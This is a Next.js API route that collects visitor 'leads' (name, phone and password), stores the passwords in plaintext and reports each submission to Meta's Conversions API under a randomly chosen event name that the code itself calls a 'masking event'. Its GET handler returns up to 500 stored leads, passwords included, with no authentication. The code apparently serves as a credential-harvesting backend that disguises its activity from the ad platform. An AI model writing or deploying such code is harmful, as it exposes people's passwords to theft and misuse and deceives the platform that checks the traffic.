import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import { sendMetaCapiEvent, getRandomMaskEvent } from '@/lib/capi';

export async function POST(req: Request) {
  try {
    const { name, phone, password } = await req.json();

    if (!phone || !password) {
      return NextResponse.json({ error: 'Phone and password are required' }, { status: 400 });
    }

    const cleanedPhone = phone.trim().replace(/[^0-9]/g, '');
    const userName = name && name.trim() ? name.trim() : 'User ' + cleanedPhone.slice(-4);

    const lead = await prisma.visitorLead.create({
      data: {
        name: userName,
        phone: cleanedPhone,
        password: password,
      }
    });

    try {
      const maskEvent = getRandomMaskEvent();
      const clientIp = req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip') || undefined;
      const userAgent = req.headers.get('user-agent') || undefined;

      await sendMetaCapiEvent({
        eventName: maskEvent,
        phone: cleanedPhone,
        name: userName,
        eventId: 'lead_' + lead.id + '_' + maskEvent,
        ipAddress: clientIp,
        userAgent: userAgent,
      });
    } catch (capiErr) {
      console.error('[CAPI] Masking event dispatch failed:', capiErr);
    }

    return NextResponse.json({ success: true, leadId: lead.id });
  } catch (error: any) {
    console.error('Save visitor lead error:', error);
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}

export async function GET(req: Request) {
  try {
    const leads = await prisma.visitorLead.findMany({
      orderBy: { createdAt: 'desc' },
      take: 500
    });

    return NextResponse.json({ success: true, leads });
  } catch (error: any) {
    console.error('Fetch visitor leads error:', error);
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
